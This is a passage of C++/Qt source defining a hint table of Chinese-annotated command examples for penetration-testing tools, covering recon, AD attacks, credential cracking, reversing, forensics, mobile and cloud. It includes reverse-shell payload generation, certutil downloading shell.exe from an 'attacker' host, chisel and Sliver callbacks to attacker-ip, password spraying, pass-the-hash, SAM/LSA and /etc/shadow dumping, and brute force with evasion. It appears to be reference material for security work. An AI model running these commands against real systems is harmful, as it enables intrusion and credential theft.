            "whatweb --input-file=urls.txt --log-json=tech.json              # 批量 + JSON\n"
            "whatweb -a 3 --log-brief=report.txt https://target             # 简洁报告"},

        {"wafw00f",
            "# WAF 防火墙检测\n"
            "wafw00f https://target -a                                       # 检测全部 WAF\n"
            "wafw00f -l urls.txt -o waf_report.csv                           # 批量检测\n"
            "wafw00f https://target -p 8080                                  # 指定端口"},

        {"katana",
            "# ProjectDiscovery 爬虫（JS 感知）\n"
            "katana -u https://target -d 5 -jc -kf all                      # 深度爬取 + JS 解析\n"
            "katana -u https://target -jc -em js,url,json -o endpoints.txt   # 提取端点\n"
            "katana -list urls.txt -d 3 -c 20 -o all_urls.txt                # 批量 + 并发\n"
            "katana -u https://target -headless                              # 无头浏览器模式"},

        {"nuclei",
            "# 基于模板的漏洞扫描器（Go，7000+ 模板）\n"
            "nuclei -u https://target -t cves/ -severity high,critical       # CVE 扫描\n"
            "nuclei -l urls.txt -t ~/nuclei-templates/ -c 50 -o results.txt  # 批量 + 并发\n"
            "nuclei -u https://target -t exposures/,misconfig/,technologies/  # 多模板目录\n"
            "nuclei -u https://target -tags xss,sqli,lfi -stats              # 按标签扫描\n"
            "nuclei -target https://target -id CVE-2024-1234                  # 指定模板 ID\n"
            "nuclei -u https://target -t nuclei-templates/ -as                # 自动扫描 + 报告"},

        // ═══════════════════════════════════════════════════════════════
        // exploit / 内网 / AD
        // ═══════════════════════════════════════════════════════════════
        {"msfconsole",
            "# Metasploit 框架 Console\n"
            "msfconsole -q                                         # 静默启动\n"
            "msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; exploit -j'\n"
            "# 常用 meterpreter 命令：\n"
            "#   sysinfo             系统信息\n"
            "#   getuid              当前用户\n"
            "#   getsystem           提权\n"
            "#   hashdump            获取密码哈希\n"
            "#   shell               获取系统 Shell\n"
            "#   migrate PID         迁移进程\n"
            "#   upload / download   文件传输\n"
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe  # Payload 生成"},

        {"searchsploit",
            "# Exploit-DB 本地搜索（Kali 自带）\n"
            "searchsploit apache 2.4.49                                # 搜索关键字\n"
            "searchsploit -m 12345                                      # 复制 exp 到当前目录\n"
            "searchsploit --nmap results.xml                            # 根据 nmap XML 结果匹配 exp\n"
            "searchsploit -w afd windows local                          # 搜索 + 显示 Exploit-DB URL\n"
            "searchsploit -t oracle windows                             # 仅搜索标题\n"
            "searchsploit -e apache 2.4                                 # 精确匹配\n"
            "searchsploit -u                                            # 更新 Exploit-DB 数据库"},

        {"netexec",
            "# 网络渗透瑞士军刀（原 CrackMapExec 的继承者）\n"
            "# SMB\n"
            "netexec smb 10.0.0.0/24 -u user -p 'Password123' --shares            # 密码喷洒\n"
            "netexec smb targets.txt -u Administrator -H NTLMHASH --local-auth   # Pass-the-Hash\n"
            "netexec smb 10.0.0.5 -u admin -p pass -x 'whoami /all'             # 执行命令\n"
            "netexec smb 10.0.0.5 -u admin -p pass --sam                         # 导出 SAM\n"
            "netexec smb 10.0.0.5 -u admin -p pass --lsa                         # 导出 LSA\n"
            "# WinRM\n"
            "netexec winrm 10.0.0.5 -u admin -p pass -x 'ipconfig'               # WinRM 执行命令\n"
            "# MSSQL\n"
            "netexec mssql 10.0.0.5 -u sa -p 'P@ssw0rd' -x 'whoami'            # MSSQL xp_cmdshell\n"
            "# LDAP\n"
            "netexec ldap 10.0.0.5 -u user -p pass --trusted-for-delegation      # AD 委派检查\n"
            "# RDP\n"
            "netexec rdp 10.0.0.5 -u admin -p pass --screenshot                  # RDP 连接 + 截图\n"
            "# FTP\n"
            "netexec ftp 10.0.0.5 -u anonymous -p ''                             # FTP 匿名登录"},

        {"evil-winrm",
            "# WinRM 远程 Shell（Ruby）\n"
            "evil-winrm -i 10.0.0.5 -u Administrator -p 'Password123'          # 密码登录\n"
            "evil-winrm -i 10.0.0.5 -u Administrator -H NTLM_HASH              # Pass-the-Hash\n"
            "evil-winrm -i 10.0.0.5 -u user -p pass -s /opt/scripts/          # 加载脚本目录\n"
            "evil-winrm -i 10.0.0.5 -u user -p pass -e /tmp/exe/              # 加载 exe 目录\n"
            "# Bypass AMSI：\n"
            "evil-winrm -i 10.0.0.5 -u admin -p pass -s /opt/ -e /opt/ \\\n"
            "    -c 'certutil -urlcache -f http://attacker/shell.exe shell.exe'"},

        {"kerbrute",
            "# Kerberos 暴力破解（Go）\n"
            "kerbrute userenum -d corp.local users.txt --dc 10.0.0.1         # 用户枚举\n"
            "kerbrute passwordspray -d corp.local users.txt 'Spring2024!' \\   # 密码喷射\n"
            "    --dc 10.0.0.1\n"
            "kerbrute bruteuser -d corp.local pass.txt admin --dc 10.0.0.1   # 单用户暴力\n"
            "kerbrute bruteforce -d corp.local pass.txt users.txt \\           # 多用户暴力\n"
            "    --dc 10.0.0.1"},

        {"responder",
            "# LLMNR/NBT-NS/mDNS 投毒（内网 NTLM 捕获）\n"
            "responder -I eth0 -wrf                                           # 全开模式\n"
            "responder -I eth0 -A                                              # 仅分析（不投毒）\n"
            "responder -I eth0 -r -d -w                                       # 不响应但拖取 + WPAD\n"
            "responder -I eth0 --lm                                            # 降级 LM 哈希\n"
            "# 配合 ntlmrelayx 使用：先用 Responder 捕获，再中继到其他主机"},

        {"mitm6",
            "# IPv6 中间人攻击（配合 ntlmrelayx）\n"
            "mitm6 -d corp.local                                              # 基本攻击\n"
            "mitm6 -d corp.local -i eth0                                      # 指定接口\n"
            "mitm6 -hw corp-dc01 -d corp.local                                # 排除特定主机\n"
            "# 先启动 mitm6，再启动 ntlmrelayx.py -t smb://DC-IP"},

        {"chisel",
            "# TCP/UDP 隧道（Go，内网穿透利器）\n"
            "# 攻击者（服务端）\n"
            "chisel server -p 8080 --reverse                                  # 反向隧道服务端\n"
            "# 受害者（客户端）\n"
            "chisel client attacker-ip:8080 R:1080:socks                      # SOCKS 代理\n"
            "chisel client attacker-ip:8080 R:3389:10.0.0.5:3389              # 端口转发\n"
            "chisel client attacker-ip:8080 R:0.0.0.0:80:127.0.0.1:80         # 本地端口暴露\n"
            "# 通过 SOCKS 代理使用工具\n"
            "proxychains4 nmap -sT -Pn 10.0.0.5                               # 通过隧道扫描"},

        {"sliver-client",
            "# BishopFox C2 框架客户端\n"
            "sliver-client                                                    # 启动客户端\n"
            "# 生成 implant\n"
            "> generate --mtls attacker-ip:443 --os windows --arch amd64 \\\n"
            "    --format exe --save /tmp/implant.exe\n"
            "# 创建 Beacon 配置\n"
            "> profiles new -b mtls://attacker:443 --os linux beacon-profile\n"
            "# 启动 Stage Listener\n"
            "> stage-listener --profile beacon-profile --url http://attacker\n"
            "# session → beacon 转换\n"
            "> use <session-id>\n"
            "> sleep 5s 0                                                    # 设置 Beacon 回调\n"
            "> execute -o cmd.exe /c 'net user'                               # 执行命令"},

        {"certipy",
            "# ADCS 证书服务攻击\n"
            "certipy find -u user@corp.local -p 'Pass123' -dc-ip 10.0.0.1   # 发现漏洞模板\n"
            "certipy req -u user@corp.local -p 'Pass123' \\                   # ESC1 攻击\n"
            "    -ca CORP-CA -template ESC1 -upn administrator@corp.local\n"
            "certipy auth -pfx admin.pfx -dc-ip 10.0.0.1                     # 获取 TGT\n"
            "certipy shadow auto -account target_user                         # Shadow Credentials"},

        {"bloodhound",
            "# AD 关系可视化分析\n"
            "neo4j console &                                      # 先启动 Neo4j 图数据库\n"
            "bloodhound --no-sandbox                               # 启动 BloodHound\n"
            "# 采集数据：\n"
            "#   bloodhound-python -u user -p pass -d corp.local -c All\n"
            "#   SharpHound.exe -c All --zip result.zip             # Windows 端\n"
            "# 导入：上传 ZIP → Analysis → 预置查询（Shortest Path 等）"},

        // ═══════════════════════════════════════════════════════════════
        // creds — 凭据攻击
        // ═══════════════════════════════════════════════════════════════
        {"hydra",
            "# THC-Hydra：支持 50+ 协议的快速暴力破解工具\n"
            "# === SSH ===\n"
            "hydra -L users.txt -P pass.txt ssh://10.0.0.5                    # 字典攻击\n"
            "hydra -l root -P pass.txt -t 4 ssh://10.0.0.5                    # 单用户 + 4线程\n"
            "hydra -l admin -P pass.txt -s 2222 ssh://10.0.0.5                # 非标准端口\n"
            "# === HTTP POST Form ===\n"
            "hydra -l admin -P pass.txt 10.0.0.5 http-post-form \\\n"
            "    '/login:user=^USER^&pass=^PASS^:F=incorrect'                 # 失败条件匹配\n"
            "hydra -L users.txt -P pass.txt 10.0.0.5 http-post-form \\\n"
            "    '/login:user=^USER^&pass=^PASS^:S=Location: dashboard'       # 成功条件匹配\n"
            "# === FTP / Telnet / RDP / SMB ===\n"
            "hydra -L users.txt -P pass.txt ftp://10.0.0.5                    # FTP\n"
            "hydra -L users.txt -P pass.txt -S ftp://10.0.0.5                 # FTPS (SSL)\n"
            "hydra -L users.txt -P pass.txt telnet://10.0.0.5                 # Telnet\n"
            "hydra -t 4 -l Administrator -P pass.txt rdp://10.0.0.5           # RDP\n"
            "hydra -L users.txt -P pass.txt smb://10.0.0.5                    # SMB\n"
            "# === 数据库 ===\n"
            "hydra -L users.txt -P pass.txt mysql://10.0.0.5                  # MySQL\n"
            "hydra -L users.txt -P pass.txt mssql://10.0.0.5                  # MSSQL\n"
            "hydra -L users.txt -P pass.txt postgres://10.0.0.5               # PostgreSQL\n"
            "# === Web 认证 ===\n"
            "hydra -L users.txt -P pass.txt 10.0.0.5 http-get /protected/     # HTTP Basic Auth\n"
            "hydra -L users.txt -P pass.txt -S 10.0.0.5 https-get /admin/     # HTTPS Basic Auth\n"
            "# === 其他常用 ===\n"
            "hydra -P pass.txt vnc://10.0.0.5                                 # VNC（无需用户名）\n"
            "hydra -P communities.txt snmp://10.0.0.5                         # SNMP 团体字\n"
            "hydra -L users.txt -P pass.txt -V -o result.txt ssh://10.0.0.5   # 详细输出 + 保存\n"
            "# === 密码生成（无需字典）===\n"
            "hydra -l admin -x 6:8:1 ssh://10.0.0.5              # 6-8 位纯数字\n"
            "hydra -l admin -x 8:8:1aA ssh://10.0.0.5            # 8 位数字+大小写\n"
            "# === 额外检查 ===\n"
            "hydra -l admin -P pass.txt -e nsr ssh://10.0.0.5    # n=空密码 s=同用户名 r=反转\n"
            "# === 规避检测 ===\n"
            "hydra -L users.txt -P pass.txt -t 1 -w 15 -u ssh://10.0.0.5      # 单线程+延迟+无序"},

        {"medusa",
            "# 并行暴力破解（支持多服务同时攻击）\n"
            "medusa -h 10.0.0.5 -U users.txt -P pass.txt -M ssh               # SSH 攻击\n"
            "medusa -H hosts.txt -U users.txt -P pass.txt -M ssh,ftp,mysql -t 20  # 多主机+多服务\n"
            "medusa -h 10.0.0.5 -U users.txt -P pass.txt -M http -m DIR:/admin \\  # HTTP 表单\n"
            "    -m FORM:'user=^USER^&pass=^PASS^:F=Login Failed'\n"
            "medusa -h 10.0.0.5 -u admin -P pass.txt -M ssh -n 2222           # 指定端口"},

        {"john",
            "# John the Ripper：离线密码破解\n"
            "john --wordlist=rockyou.txt hashes.txt                            # 字典攻击\n"
            "john --rules --wordlist=rockyou.txt hashes.txt                    # 规则变换\n"
            "john --incremental hashes.txt                                     # 增量模式（暴力）\n"
            "john --show hashes.txt                                            # 显示已破解\n"
            "john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt           # 指定格式\n"
            "john --list=formats                                               # 列出支持格式\n"
            "# 合并文件再破解\n"
            "unshadow /etc/passwd /etc/shadow > unshadowed.txt\n"
            "john --wordlist=rockyou.txt unshadowed.txt                        # Unix 密码\n"
            "# 恢复中断的会话\n"
            "john --restore                                                    # 从检查点恢复"},

        {"hashcat",
            "# GPU 密码破解（世界最快），支持 350+ 哈希类型\n"
            "# === 攻击模式 (-a) ===\n"
            "hashcat -m 0 -a 0 hashes.txt rockyou.txt    # 0=字典攻击: MD5\n"
            "hashcat -m 1000 -a 3 ntlm.txt ?l?l?l?l?d?d?d?d  # 3=掩码攻击: 8位小写+数字\n"
            "hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d    # 6=字典+掩码后缀\n"
            "hashcat -m 1000 -a 7 hashes.txt ?d?d rockyou.txt     # 7=掩码前缀+字典\n"
            "hashcat -m 0 -a 1 hashes.txt wl1.txt wl2.txt         # 1=组合攻击\n"
            "# === 常用哈希类型 (-m) ===\n"
            "# 0=MD5   100=SHA1   1000=NTLM   1400=SHA256   3200=bcrypt\n"
            "# 500=md5crypt($1$)   1800=sha512crypt($6$)   7400=sha256crypt($5$)\n"
            "# 5600=NetNTLMv2   13100=KerberosTGS   18200=KerberosASREP\n"
            "# 22000=WPA-PMKID   3000=LM   1100=DomainCachedCreds\n"
            "# === 掩码字符集 ===\n"
            "# ?l=小写 ?u=大写 ?d=数字 ?s=特殊 ?a=全部 ?b=0x00-0xff\n"
            "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --increment    # 增量暴力: 1-8位\n"
            "hashcat -m 1000 -a 3 ntlm.txt -1 ?l?d ?1?1?1?1?1?1?1?1      # 自定义字符集\n"
            "# === 规则/优化 ===\n"
            "hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule  # 最佳64规则\n"
            "hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule\n"
            "hashcat -m 1000 -a 0 -O -w 4 hashes.txt rockyou.txt          # 优化内核+全速\n"
            "# === Kerberoasting / AS-REP ===\n"
            "hashcat -m 13100 -a 0 kerb.txt rockyou.txt -r rules/best64.rule\n"
            "hashcat -m 18200 -a 0 asrep.txt rockyou.txt -r rules/best64.rule\n"
            "# === WPA/WPA2 ===\n"
            "hashcat -m 22000 -a 3 capture.hc22000 ?d?d?d?d?d?d?d?d      # 8位数字 WiFi\n"
            "# === 会话管理 ===\n"
            "hashcat --session=job1 -m 1000 -a 0 hashes.txt rockyou.txt   # 命名会话\n"
            "hashcat --restore --session=job1                              # 恢复会话\n"
            "hashcat -m 1000 hashes.txt --show                             # 显示已破解\n"
            "hashcat -m 1000 -a 0 -o cracked.txt hashes.txt rockyou.txt    # 输出到文件\n"
            "# === 设备管理 ===\n"
            "hashcat -I                                                     # 查看 GPU 信息\n"
            "hashcat -b -m 1000                                             # 基准测试\n"
            "hashcat -d 1 -m 1000 hashes.txt rockyou.txt                    # 指定 GPU 1"},

        {"hashid",
            "# 哈希类型识别\n"
            "hashid '$2y$10$abcdefghijklmnopqrstuv'                         # 识别单个哈希\n"
            "hashid -m '$P$9abcdefghijklmnopqrstuv'                         # 显示 hashcat 模式号\n"
            "hashid -j '$6$abcdefghijklmnopqrstuv'                          # 显示 John 格式\n"
            "hashid -e hashes.txt                                            # 从文件批量识别"},

        // ═══════════════════════════════════════════════════════════════
        // reverse / pwn
        // ═══════════════════════════════════════════════════════════════
        {"r2",
            "# radare2 逆向框架\n"
            "r2 -A ./binary                          # 自动分析\n"
            "r2 -d ./binary                          # 调试模式\n"
            "r2 -w ./binary                          # 写模式（修改二进制）\n"
            "# 常用命令（进入 r2 后）：\n"
            "> aaaa                                  # 全面分析\n"
            "> afl                                   # 列出所有函数\n"
            "> pdf @ main                            # 反汇编 main 函数\n"
            "> s sym.main                            # 跳转到 main\n"
            "> VV                                    # 图形模式\n"
            "> izz                                   # 列出所有字符串\n"
            "> / password                            # 搜索字符串\n"
            "> axt sym.main                          # 查找对 main 的引用\n"
            "> afl~malloc                            # 过滤函数名\n"
            "> wx 90                                 # 写入 NOP 字节\n"
            "> ood                                   # 重新打开为调试模式"},

        {"cutter",
            "cutter ./binary    # radare2 的 GUI 前端（图形化反编译 + 十六进制编辑）"},

        {"ghidra",
            "# NSA 开源逆向框架\n"
            "ghidra                   # 启动后：File→New Project→Import File→双击分析\n"
            "# 常用操作：\n"
            "#   L → 重命名符号     ; → 添加注释\n"
            "#   Ctrl+E → 导出程序   Ctrl+Shift+E → 导出选中\n"
            "#   Window → Decompile → 查看反编译代码"},

        {"gdb",
            "# GNU 调试器\n"
            "gdb -q ./binary                            # 加载程序\n"
            "gdb -p PID                                 # 附加进程\n"
            "gdb --args ./binary arg1 arg2              # 带参数启动\n"
            "# 常用 GDB 命令：\n"
            "(gdb) break main                           # 在 main 下断点\n"
            "(gdb) break *0x401000                      # 在地址下断点\n"
            "(gdb) run                                  # 运行\n"
            "(gdb) continue / c                         # 继续执行\n"
            "(gdb) stepi / si                           # 单步指令\n"
            "(gdb) nexti / ni                           # 单步跳过\n"
            "(gdb) info registers                       # 查看寄存器\n"
            "(gdb) x/20x $rsp                           # 查看栈（20 个字）\n"
            "(gdb) x/s 0x7fffffffe000                   # 查看字符串\n"
            "(gdb) disassemble main                     # 反汇编函数\n"
            "(gdb) set $eax = 0x41                      # 修改寄存器\n"
            "(gdb) set {int}0x601000 = 0x0              # 修改内存\n"
            "(gdb) info proc mappings                   # 查看内存映射\n"
            "(gdb) backtrace / bt                       # 调用栈\n"
            "(gdb) define hook-stop                     # 定义停止钩子\n"
            "  > info registers\n  > x/10i $rip\n  > end"},

        {"pwndbg",
            "# GDB Pwn 插件（自动加载）\n"
            "gdb ./binary                # pwndbg 自动激活\n"
            "(gdb) checksec               # 安全机制：PIE/NX/Canary/RELRO\n"
            "(gdb) vmmap                  # 虚拟内存映射\n"
            "(gdb) ctx                    # 上下文视图（寄存器+栈+反汇编+回溯）\n"
            "(gdb) heap                   # 堆分析（bins、chunks）\n"
            "(gdb) telescope $rsp 20      # 望远镜式内存查看\n"
            "(gdb) search -t string 'flag'  # 搜索字符串\n"
            "(gdb) cyclic 100             # 生成 De Bruijn 序列\n"
            "(gdb) cyclic -l 0x61616172   # 查找偏移"},

        {"checksec",
            "# 检查二进制安全加固（来自 pwntools）\n"
            "checksec --file=./binary                     # 单个文件\n"
            "checksec --dir=./bins/                       # 目录批量\n"
            "checksec --file=./binary --output=json        # JSON 输出\n"
            "# 检查项：PIE / NX / Canary / RELRO / RPATH / RUNPATH / Fortify"},

        {"ropper",
            "# ROP Gadget 搜索\n"
            "ropper -f ./binary --search 'pop rdi'        # 搜特定 gadget\n"
            "ropper -f ./binary --all > gadgets.txt       # 全部导出\n"
            "ropper -f ./binary --search 'pop r%'         # 正则搜索\n"
            "ropper -f ./binary --search 'syscall'        # syscall gadget\n"
            "ropper -f ./binary --chain 'execve cmd=/bin/sh'  # 自动生成 ROP 链"},

        {"ROPgadget",
            "# ROP Gadget 搜索（比 ropper 更静态）\n"
            "ROPgadget --binary ./binary --only 'pop|ret'            # 搜特定指令\n"
            "ROPgadget --binary ./binary > all_gadgets.txt           # 全部导出\n"
            "ROPgadget --binary ./binary --depth 10                  # 最大 gadget 深度\n"
            "ROPgadget --binary ./binary --filter 'pop rdi'          # 过滤"},

        {"one_gadget",
            "# libc 一键 getshell gadget 查找\n"
            "one_gadget /lib/x86_64-linux-gnu/libc.so.6              # 查找所有\n"
            "one_gadget /lib/x86_64-linux-gnu/libc-2.31.so -l 1      # 特定 level\n"
            "# 注意：需要满足栈约束条件才能成功 getshell"},

        // ═══════════════════════════════════════════════════════════════
        // forensic / stego
        // ═══════════════════════════════════════════════════════════════
        {"binwalk",
            "# 固件分析：文件签名扫描 + 提取\n"
            "binwalk firmware.bin                                        # 仅扫描签名\n"
            "binwalk -e firmware.bin                                     # 自动提取\n"
            "binwalk -Me firmware.bin                                    # 递归提取\n"
            "binwalk -E firmware.bin                                     # 熵分析（可视化）\n"
            "binwalk -A firmware.bin                                     # 操作码签名扫描\n"
            "binwalk -W firmware1.bin firmware2.bin                      # 对比两个固件\n"
            "binwalk -D 'png:png:0' firmware.bin                         # 指定提取规则"},

        {"foremost",
            "# 文件雕刻（基于文件头尾特征的删除文件恢复）\n"
            "foremost -i image.dd -o output/                             # 从磁盘镜像恢复\n"
            "foremost -t jpg,png,pdf,doc,xls,zip -i disk.img -o recovered/  # 指定类型\n"
            "foremost -v -i image.dd -o output/                          # 详细模式\n"
            "foremost -i image.dd -o output/ -c /etc/foremost.conf       # 使用自定义配置"},

        {"exiftool",
            "# 读写元数据\n"
            "exiftool image.jpg                                          # 显示全部元数据\n"
            "exiftool -GPS:all image.jpg                                 # GPS 信息\n"
            "exiftool -a -u -g1 image.jpg                                # 显示重复+未知标签\n"
            "exiftool -all= image.jpg                                    # 清除全部元数据\n"
            "exiftool -Comment='My Comment' image.jpg                    # 写入评论\n"
            "exiftool -ext jpg -r . > metadata.txt                       # 递归导出目录元数据\n"
            "exiftool -if '$GPSPosition' -r /photos/                     # 查找含 GPS 的图片"},

        {"steghide",
            "# 隐写：图片/音频嵌入与提取\n"
            "steghide extract -sf cover.jpg -p 'passphrase'              # 提取隐藏数据\n"
            "steghide embed -cf cover.jpg -ef secret.txt -p 'passphrase' # 嵌入数据\n"
            "steghide info cover.jpg                                     # 查看是否有隐藏内容\n"
            "steghide embed -cf cover.wav -ef secret.txt \\               # 音频嵌入\n"
            "    -e rijndael-128 -p 'passphrase'"},

        {"zsteg",
            "# PNG/BMP 隐写检测（Ruby）\n"
            "zsteg -a image.png                                          # 全面检测\n"
            "zsteg --all image.png | grep -i flag                        # 搜索 flag\n"
            "zsteg -E 'b1,r,lsb,xy' image.png > extracted.bin            # 提取特定通道\n"
            "zsteg image.png --bits 1 --channel r --lsb                  # LSB 最低位检测"},

        {"testdisk",
            "# 分区表恢复（交互式）\n"
            "testdisk image.dd                                           # 恢复分区\n"
            "testdisk /dev/sda                                            # 处理物理磁盘\n"
            "# 流程：选择分区表类型 → Analyse → Quick Search → Write\n"
            "# 配合 photorec 恢复文件：\n"
            "photorec image.dd                                            # 恢复删除文件"},

        {"vol",
            "# Volatility3：内存取证分析\n"
            "vol -f memory.dmp windows.info                              # 系统信息\n"
            "vol -f memory.dmp windows.pslist                            # 进程列表\n"
            "vol -f memory.dmp windows.pstree                            # 进程树\n"
            "vol -f memory.dmp windows.netscan                           # 网络连接\n"
            "vol -f memory.dmp windows.cmdline                           # 命令行参数\n"
            "vol -f memory.dmp windows.dlllist --pid 1234                # 指定进程 DLL\n"
            "vol -f memory.dmp windows.filescan                          # 文件扫描\n"
            "vol -f memory.dmp windows.dumpfiles --pid 4321              # 导出文件\n"
            "vol -f memory.dmp windows.registry.hivelist                 # 注册表 Hive\n"
            "vol -f memory.dmp windows.hashdump                          # 导出密码哈希\n"
            "vol -f memory.dmp windows.malfind                           # 恶意代码扫描\n"
            "# Linux 内存分析\n"
            "vol -f memory.dmp linux.pslist\n"
            "vol -f memory.dmp linux.proc.map --pid 1234"},

        // ═══════════════════════════════════════════════════════════════
        // mobile
        // ═══════════════════════════════════════════════════════════════
        {"apktool",
            "# APK 反编译/重打包（Java）\n"
            "apktool d app.apk -o output/                                # 反编译为 smali\n"
            "apktool d -s app.apk                                        # 仅反编译 dex（不解码资源）\n"
            "apktool b output/ -o patched.apk                            # 重打包\n"
            "apktool b output/ --use-aapt2 -o patched.apk                # 使用 aapt2\n"
            "# 签名（重打包后必须）\n"
            "keytool -genkey -v -keystore my.keystore -alias app -keyalg RSA -keysize 2048 -validity 10000\n"
            "jarsigner -verbose -keystore my.keystore patched.apk app"},

        {"frida",
            "# 动态插桩框架（JavaScript Hook）\n"
            "frida -U -f com.app.id -l hook.js --no-pause               # 注入启动\n"
            "frida -U com.app.id -l hook.js                              # 附加运行中进程\n"
            "frida-ps -U                                                 # 列出 USB 设备进程\n"
            "frida-ps -Uai                                               # 列出已安装应用\n"
            "frida-trace -U -i 'open' com.app.id                         # 跟踪 libc open 调用\n"
            "frida-trace -U -m '-[NSURL*]' Safari                        # 跟踪 ObjC 方法\n"
            "# 常用 Hook 代码：\n"
            "# Java.perform(function() {\n"
            "#   var cls = Java.use('com.app.MainActivity');\n"
            "#   cls.getFlag.implementation = function() { return 'hooked'; };\n"
            "# });"},

        {"objection",
            "# Frida 封装（移动安全评估）\n"
            "objection -g com.app.id explore                            # 探索模式\n"
            "objection -g com.app.id runscript --script-path hook.js    # 运行脚本\n"
            "# 常用 objection 命令：\n"
            "> android hooking list classes                             # 列出已加载类\n"
            "> android hooking watch class com.app.MainActivity          # 监控类\n"
            "> android sslpinning disable                               # 禁用 SSL Pinning\n"
            "> android root disable                                     # 禁用 Root 检测\n"
            "> android keystore list                                    # 列出 Keystore\n"
            "> ios keychain dump                                        # iOS Keychain 导出"},

        {"jadx-gui",
            "jadx-gui app.apk    # DEX→Java 反编译 GUI（支持 APK/DEX/AAR/JAR）\n"
            "jadx -d output_dir/ app.apk    # 命令行反编译"},

        // ═══════════════════════════════════════════════════════════════
        // traffic
        // ═══════════════════════════════════════════════════════════════
        {"wireshark",
            "wireshark    # 图形化抓包分析\n"
            "# 常用显示过滤器：\n"
            "#   http.request.method == 'POST'\n"
            "#   tcp.port == 443 and ip.src == 192.168.1.100\n"
            "#   dns.qry.name contains 'example'\n"
            "#   tls.handshake.type == 1              # Client Hello\n"
            "#   frame contains 'password'\n"
            "#   tcp.flags.syn == 1 and tcp.flags.ack == 0   # 仅 SYN 包\n"
            "# 捕获过滤器（BPF 语法，启动前设置）：\n"
            "#   host 192.168.1.1 and not port 22\n"
            "#   tcp port 80 or tcp port 443\n"
            "# 统计：Statistics → Protocol Hierarchy / Conversations"},

        {"tcpdump",
            "# 命令行抓包\n"
            "tcpdump -i eth0 -n -w capture.pcap                         # 抓包保存\n"
            "tcpdump -i eth0 -n 'port 443 and host 10.0.0.5'            # 过滤抓包\n"
            "tcpdump -r capture.pcap 'tcp[tcpflags] & tcp-syn != 0'     # 读取 + 仅 SYN\n"
            "tcpdump -i eth0 -n 'udp port 53 or tcp port 53'            # DNS 流量\n"
            "tcpdump -i eth0 -n 'icmp or arp'                           # ICMP/ARP\n"
            "tcpdump -i eth0 -n -A 'tcp port 80'                        # ASCII 显示 HTTP\n"
            "tcpdump -i eth0 -nn -v -s 1500 -c 100                      # 详细模式+100包+不分片\n"
            "tcpdump -i any -n 'port 22' -w ssh.pcap                    # 所有接口 SSH 流量"},

        {"mitmproxy",
            "# 中间人代理\n"
            "mitmproxy -p 8080                                           # CLI 界面\n"
            "mitmweb -p 8080                                             # Web 界面（推荐）\n"
            "mitmproxy --mode transparent -p 8080                        # 透明代理\n"
            "mitmproxy --mode upstream:http://10.0.0.1:8080 -p 8080     # 上游代理\n"
            "mitmdump -p 8080 -w traffic.mitm                            # 静默录制\n"
            "# 配合脚本（Python）：\n"
            "mitmproxy -s script.py -p 8080                              # 加载处理脚本"},

        {"burpsuite",
            "# Burp Suite 专业 Web 代理\n"
            "burpsuite    # 启动后：Proxy → Options → 127.0.0.1:8080\n"
            "# 浏览器设置代理 127.0.0.1:8080，安装 Burp CA 证书\n"
            "# 核心功能：Proxy/Repeater/Intruder/Decoder/Collaborator"},

        {"zaproxy",
            "# OWASP ZAP Web 扫描器\n"
            "zaproxy    # 启动 GUI\n"
            "zaproxy -daemon -host 0.0.0.0 -port 8090                    # 守护进程模式\n"
            "# 自动化：Quick Start → Automated Scan → 输入 URL\n"
            "# API 扫描：zap-api-scan.py -t https://target/swagger.json -f openapi"},

        // ═══════════════════════════════════════════════════════════════
        // crypto / cloud
        // ═══════════════════════════════════════════════════════════════
        {"prowler",
            "# 云安全审计（AWS/Azure/GCP）\n"
            "prowler aws -M cli                                           # AWS CLI 模式\n"
            "prowler azure --output-formats csv,json-ocsf                 # Azure + 多格式\n"
            "prowler gcp --project-id my-project                          # GCP\n"
            "prowler aws -M html -o ./report/                             # HTML 报告\n"
            "prowler aws -c ec2 -c s3 -c iam                              # 仅审计特定服务\n"
            "prowler aws -s -M json-asff                                   # AWS Security Hub 格式"},

        {"scoutsuite",
            "# 多云安全审计\n"
            "scout aws -p default                                          # AWS 审计\n"
            "scout azure --cli                                             # Azure 审计\n"
            "scout gcp --project-id my-project                             # GCP 审计\n"
            "# 报告生成在 HTML 中，浏览器打开 scoutsuite-report/scoutsuite-results/scoutsuite.html"},

        {"pacu",
            "# AWS 漏洞利用框架（交互式）\n"
            "pacu    # 启动后：\n"
            "> import_keys MyKeys                                          # 导入 AWS 密钥\n"
            "> ls                                                          # 列出模块\n"
            "> run iam__enum_users                                         # 枚举 IAM 用户\n"
            "> run iam__enum_permissions                                   # 枚举权限\n"
            "> run s3__enum_buckets                                        # 枚举 S3 Bucket\n"
            "> run ec2__enum_instances                                     # 枚举 EC2\n"
            "> data                                                        # 查看收集的数据"},

        {"sage",
            "# SageMath：数学/密码分析 CAS\n"
            "sage\n"
            "> factor(123456789012345678901234567890)               # 大数分解\n"
            "> discrete_log(Mod(2, 23), Mod(5, 23))                 # 离散对数\n"
            "> E = EllipticCurve(GF(p), [a, b])                    # 椭圆曲线\n"
            "> E.order()                                            # 曲线阶\n"
            "> CRT([2, 3, 5], [3, 5, 7])                           # 中国剩余定理\n"
            "> GF(2^8).gen()                                        # 有限域\n"
            "> matrix([[1,2],[3,4]])^100                           # 矩阵幂运算"},

        // ═══════════════════════════════════════════════════════════════
        // misc
        // ═══════════════════════════════════════════════════════════════
        {"enum4linux-ng",
            "# SMB 枚举（enum4linux 的 Python 重写版）\n"
            "enum4linux-ng -A 10.0.0.5                                    # 全面枚举\n"
            "enum4linux-ng -A 10.0.0.5 -u user -p 'pass'                  # 带凭据\n"
            "enum4linux-ng -U 10.0.0.5                                     # 仅用户枚举\n"
            "enum4linux-ng -S 10.0.0.5                                     # 仅共享枚举\n"
            "enum4linux-ng -G 10.0.0.5                                     # 仅组枚举\n"
            "enum4linux-ng -P 10.0.0.5                                     # 仅密码策略\n"
            "enum4linux-ng -O 10.0.0.5                                     # 仅 OS 信息\n"
            "enum4linux-ng -oJ output.json 10.0.0.5                        # JSON 输出"},
    };

    auto it = kHints.constFind(key);
    if (it != kHints.constEnd()) return it.value();
    return QStringLiteral(
        "$ %1 --help        # 列出参数\n"
